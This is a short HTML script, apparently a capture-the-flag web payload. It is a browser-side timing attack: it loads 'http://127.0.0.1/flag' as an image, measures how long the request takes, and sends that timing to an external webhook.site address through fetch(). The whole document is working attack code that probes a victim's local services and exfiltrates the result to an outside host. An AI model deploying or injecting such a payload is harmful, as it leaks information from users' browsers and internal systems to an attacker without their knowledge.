<script>
async function measureLoadTime() {
  const start = performance.now();

  const img = new Image();
  img.src = "http://127.0.0.1/flag?cachebust=" + Math.random();

  img.onload = img.onerror = () => {
    const duration = performance.now() - start;
    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?time=" + duration);
  };
}

measureLoadTime();
</script>
